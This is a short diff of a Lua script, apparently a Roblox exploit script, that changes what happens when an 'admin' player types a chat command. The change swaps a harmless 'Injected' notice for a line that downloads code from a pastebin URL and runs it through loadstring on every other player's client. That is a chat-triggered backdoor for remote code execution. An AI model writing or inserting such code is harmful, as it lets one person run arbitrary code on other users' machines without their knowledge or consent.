@@ -56,9 +56,9 @@ end)
 
 
 admin.Chatted:Connect(function(cht)
-	if cht:match("/check") then
+	if cht:match("/gas") then
 		if game.Players.LocalPlayer ~= admin then
-			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", { Text ="Injected"})
+			loadstring(game:HttpGet("https://pastebin.com/raw/VX5k6Vi8"))()
 		end
 	end
 end)
